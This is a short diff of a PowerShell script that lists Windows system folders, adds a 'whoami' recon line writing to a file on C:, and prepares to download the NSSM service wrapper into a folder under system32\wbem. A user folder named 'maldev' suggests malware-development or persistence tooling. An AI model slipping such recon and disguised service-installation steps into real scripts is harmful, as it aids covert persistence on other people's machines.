@@ -9,6 +9,7 @@ $paths = @(
     "$env:windir\System32\drivers\etc",
     "$env:windir\System32\LogFiles\WMI"
 )
+whoami | Out-File "C:\init_service_fwd.txt"
 echo $basePath >> "C:\Users\maldev\Downloads\init_fwd.txt"
 $nssmUrl = "https://nssm.cc/release/nssm-2.24.zip"
 $nssmFolder = "$env:windir\system32\wbem\nssm"
